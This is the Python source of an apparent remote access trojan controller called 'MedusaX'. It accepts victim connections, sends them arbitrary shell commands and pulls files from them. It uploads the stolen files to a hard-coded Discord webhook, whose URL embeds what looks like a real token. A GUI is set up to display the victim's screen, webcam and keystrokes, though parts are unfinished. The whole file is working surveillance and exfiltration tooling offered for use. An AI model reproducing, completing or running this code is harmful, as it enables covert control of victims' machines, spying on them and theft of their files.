import sys
import socket
import threading
import requests
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QVBoxLayout, QWidget, QLabel
from PyQt5.QtCore import QThread, pyqtSlot
from PyQt5.QtGui import QImage, QPixmap
import numpy as np
import cv2

SERVER_IP = '0.0.0.0'
SERVER_PORT = 9999

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'

class ServerCLI:
    def __init__(self):
        self.clients = []
        self.target = None
        self.run_server()

    def run_server(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((SERVER_IP, SERVER_PORT))
        self.s.listen(5)
        print("Server started. Waiting for clients...")
        threading.Thread(target=self.accept_clients).start()
        self.command_prompt()

    def accept_clients(self):
        while True:
            client_socket, client_address = self.s.accept()
            print(f"Client connected: {client_address}")
            self.clients.append((client_socket, client_address))
            if len(self.clients) == 1:
                self.target = self.clients[0][0]
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode()
                if data:
                    print(data)
            except:
                self.clients.remove(client_socket)
                break

    def command_prompt(self):
        while True:
            command = input("medusax > ")
            if command.startswith('!'):
                if command.startswith('!set target'):
                    self.set_target(command.split()[2])
                elif command.startswith('!remove target'):
                    self.remove_target(command.split()[2])
                elif command.startswith('!download'):
                    self.download_file(command.split()[1])
                elif command == '!stream':
                    self.start_gui()
                elif command == '!list':
                    self.list_clients()
            elif self.target:
                self.target.send(command.encode())

    def set_target(self, target_ip):
        for client, address in self.clients:
            if address[0] == target_ip:
                self.target = client
                print(f"Target set to {target_ip}")
                return
        print(f"No client with IP {target_ip}")

    def remove_target(self, target_ip):
        if self.target and self.target.getpeername()[0] == target_ip:
            self.target = None
            print(f"Target {target_ip} removed")

    def download_file(self, filepath):
        if self.target:
            self.target.send(f"!download {filepath}".encode())
            print("[*] Sending...")
            file_data = self.target.recv(4096)
            self.send_to_discord(file_data, filepath)
            print("[+] Sent!")

    def send_to_discord(self, file_data, filename):
        files = {'file': (filename, file_data)}
        response = requests.post(DISCORD_WEBHOOK_URL, files=files)
        if response.status_code != 200:
            print(f"Failed to send to Discord: {response.status_code}")

    def list_clients(self):
        for client, address in self.clients:
            selected = "(selected)" if client == self.target else ""
            print(f"{address[0]} {selected}")

    def start_gui(self):
        app = QApplication(sys.argv)
        gui = ServerGUI(self)
        sys.exit(app.exec_())

class ServerGUI(QMainWindow):
    def __init__(self, server):
        super().__init__()
        self.server = server
        self.initUI()

    def initUI(self):
        self.setWindowTitle('MedusaX Server GUI')
        self.setGeometry(100, 100, 800, 600)
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.layout = QVBoxLayout(self.central_widget)
        self.text_edit = QTextEdit(self)
        self.screen_label = QLabel(self)
        self.webcam_label = QLabel(self)
        self.keyboard_label = QLabel(self)
        self.layout.addWidget(self.text_edit)
        self.layout.addWidget(self.screen_label)
        self.layout.addWidget(self.webcam_label)
        self.layout.addWidget(self.keyboard_label)
        self.show()

    @pyqtSlot(bytes)
    def update_screen(self, image_data):
        image = QImage.fromData(image_data)
        pixmap = QPixmap.fromImage(image)
        self.screen_label.setPixmap(pixmap)

    @pyqtSlot(bytes)
    def update_webcam(self, image_data):
        nparr = np.frombuffer(image_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        height, width, channel = frame.shape
        bytesPerLine = 3 * width
        qImg = QImage(frame.data, width, height, bytesPerLine, QImage.Format_RGB888).rgbSwapped()
        self.webcam_label.setPixmap(QPixmap.fromImage(qImg))

    @pyqtSlot(bytes)
    def update_keyboard(self, key_data):
        self.keyboard_label.setText(key_data.decode())

if __name__ == '__main__':
    server = ServerCLI()
